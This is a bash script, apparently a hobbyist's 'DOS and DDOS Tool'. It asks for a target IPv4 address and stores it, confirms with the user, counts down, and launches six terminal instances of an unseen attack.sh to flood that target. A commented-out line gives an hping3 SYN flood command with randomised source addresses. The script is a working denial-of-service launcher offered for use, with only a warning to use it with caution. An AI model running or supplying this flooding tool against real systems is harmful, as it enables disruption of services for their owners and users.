#/bin/bash

echo "|#*#*#*#*#*#*#~SP's DOS and DDOS Tool~#*#*#*#*#*#*#|"

cat /home/patrickbateman/IT_Hobby_Stuff/Bash/DDOS_Tool/logo.txt

truncate -s 0 ip_address.txt

read -p "Enter the IP address you would like to target (ipv4 format): " target_ip
echo "You entered $target_ip"

echo "$target_ip">> ip_address.txt

read -p "WARNING* if you proceed you cannot undo this. Input y to proceed and n to cancel." proceed

#if block
if [ $proceed == y ]; then

	echo "Proceeding..................................................."
	echo "DDOS attack will start in 20 seconds"
	sleep 5

elif [ $proceed == n ]; then
	echo "Exiting!!!"
	exit
else 
	echo "Please enter y or n"

fi

echo "In order to make this a DDOS this tool will launch 6 instanes using the DDOS command so the attack is theoretically distributed. 
In order to stop the attack you will need to either close all terminals or use ctrl + c to stop the command on each one.
******Please use this tool with caution.******"

sleep 12

echo "Attack starting in 3"
sleep 1
echo "Attack starting in 2"
sleep 1
echo "Attack starting in 1"

echo "DDOS attack started :)" 


chmod +x attack.sh

#loop for instances

gnome-terminal -x ./attack.sh
gnome-terminal -x ./attack.sh
gnome-terminal -x ./attack.sh
gnome-terminal -x ./attack.sh
gnome-terminal -x ./attack.sh
gnome-terminal -x ./attack.sh


#sudo hping3 -S --flood --rand-source $target_ip

 
